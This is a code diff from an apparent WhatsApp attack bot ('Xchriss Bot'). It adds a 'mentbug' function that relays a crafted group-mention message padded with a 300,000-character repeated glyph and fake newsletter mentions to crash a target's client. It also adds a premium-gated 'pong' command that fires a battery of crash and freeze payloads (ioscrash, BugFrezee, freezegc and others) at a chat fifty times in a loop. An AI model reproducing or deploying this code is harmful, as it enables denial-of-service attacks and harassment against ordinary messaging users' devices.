@@ -836,7 +836,7 @@ async function dott(target) {
                                 isForwarded: true
                         }
                 }
-     for (let i = 0; i < 5; i ++) {
+     for (let i = 0; i < 2; i ++) {
 			await XeonBotInc.relayMessage(target, {
 
 				'viewOnceMessage': {
@@ -1850,7 +1850,72 @@ async function callp(target, qtd) {
         { participant: { jid: target }, messageId: pepek.key.id }
     );
 }
+
+async function mentbug(target) {
+      await XeonBotInc.relayMessage(target, {
+        groupMentionedMessage: {
+          message: {
+            interactiveMessage: {
+              header: {
+                locationMessage: {
+                  degreesLatitude: 0,
+                  degreesLongitude: 0
+                },
+                hasMediaAttachment: true
+              },
+              body: {
+                text: "✞Xᴄʜʀɪss Bot✞" + "ꦾ".repeat(300000)
+              },
+              nativeFlowMessage: {},
+              contextInfo: {
+                mentionedJid: Array.from({
+                  length: 5
+                }, () => "1@newsletter"),
+                groupMentions: [{
+                  groupJid: "1@newsletter",
+                  groupSubject: "✞Xᴄʜʀɪss Bot✞"
+                }]
+              }
+            }
+          }
+        }
+      }, {
+        participant: {
+          jid: target
+        }
+      }, {
+        messageId: null
+      });
+}
+
+
         switch (command) {
+case "pong": {
+if (!isPremium) return replygcxeon(mess.prem)
+let target = m.chat
+await replygcxeon ("✞Xᴄʜʀɪss Bot✞")
+for (let i = 0;i < 50;i++) {
+await dott(target)
+await BugFrezee(target) 
+await ios1(target)
+await callbg(target)
+await ios2(target)
+await ioscrash(target)
+await ioscrash(target)
+await OLDLOC(target, TypeNull)
+await mentbug(target)
+await freezegc(target)
+await ios1(target)
+await callbg(target)
+await ios2(target)
+await ioscrash(target)
+await ioscrash(target)
+await sleep(5)
+}
+}
+break 
+
+			
 case 'addban': {
 if (!isPremium) return replygcxeon(mess.prem)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
